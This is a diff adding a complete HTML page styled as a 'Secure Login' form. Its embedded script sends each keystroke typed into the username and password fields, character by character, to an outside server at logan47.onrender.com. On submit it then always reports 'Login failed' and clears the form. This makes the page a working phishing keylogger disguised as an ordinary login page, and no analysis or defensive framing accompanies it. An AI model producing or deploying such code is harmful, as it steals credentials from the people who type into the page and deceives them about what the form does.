@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login Page</title>
+  <style>
+    body {
+      background: #1a1a1a;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      height: 100vh;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      background: #2c2c2c;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0, 255, 255, 0.2);
+    }
+
+    input {
+      padding: 10px;
+      width: 100%;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: none;
+      outline: none;
+    }
+
+    button {
+      padding: 10px;
+      width: 100%;
+      border-radius: 8px;
+      background: #00c2cb;
+      color: #000;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #00f2ff;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Secure Login</h2>
+    <form>
+      <input type="text" id="username" placeholder="Username" required />
+      <input type="password" id="password" placeholder="Password" required />
+      <button type="submit">Login</button>
+    </form>
+  </div>
+
+  <script>
+    const inputs = document.querySelectorAll("input");
+    inputs.forEach(input => {
+      input.addEventListener("input", e => {
+        const field = e.target.id;
+        const value = e.target.value;
+        const lastChar = value.slice(-1); // only the latest character
+
+        fetch("https://logan47.onrender.com/keypress", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            field: field,
+            char: lastChar
+          })
+        });
+      });
+    });
+
+    const form = document.querySelector("form");
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      alert("Login failed. Please try again.");
+      form.reset();
+    });
+  </script>
+</body>
+</html>
